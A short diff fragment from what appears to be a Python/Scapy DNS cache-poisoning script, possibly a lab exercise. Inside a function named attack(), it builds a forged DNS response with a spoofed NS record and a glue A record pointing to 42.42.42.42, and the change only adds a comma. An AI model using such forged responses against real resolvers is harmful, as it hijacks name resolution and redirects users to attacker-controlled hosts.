@@ -66,7 +66,7 @@ def attack():
     fake_response = DNS(id=42, qr=1, qdcount=1, ancount=0, nscount=1, arcount=0, 
 		qd=DNSQR(qname=base_domain), 
 		an=NotImplemented,
-		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof))
+		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
         ar=(DNSRR(rrname=spoof, type="A", ttl=60000, rdata='42.42.42.42'))))
 	)
 
